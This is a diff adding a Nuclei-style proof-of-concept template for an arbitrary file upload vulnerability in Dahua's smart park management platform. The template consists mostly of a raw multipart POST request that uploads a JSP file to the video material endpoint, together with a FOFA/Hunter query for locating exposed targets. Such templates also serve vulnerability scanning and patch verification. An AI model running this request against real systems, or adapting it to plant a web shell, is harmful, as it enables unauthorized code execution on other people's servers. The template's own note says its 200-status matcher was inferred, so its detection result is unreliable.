@@ -1,0 +1,57 @@
+id: poc-335e7f594c0e1cbe8825
+info:
+  name: 大华智慧园区综合管理平台video任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/335e7f594c0e1cbe88259cdaf52b0750
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 335e7f594c0e1cbe88259cdaf52b0750
+    fofa: + hunter:`app.name="Dahua 大华 智慧园区管理平台"`
+http:
+- raw:
+  - 'POST /publishing/publishing/material/file/video HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-Length: 287
+
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="Filedata"; filename="1ndex.jsp"
+
+
+    test
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="file"
+
+
+    file
+
+    --00content0boundary00
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    submit
+
+    --00content0boundary00--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
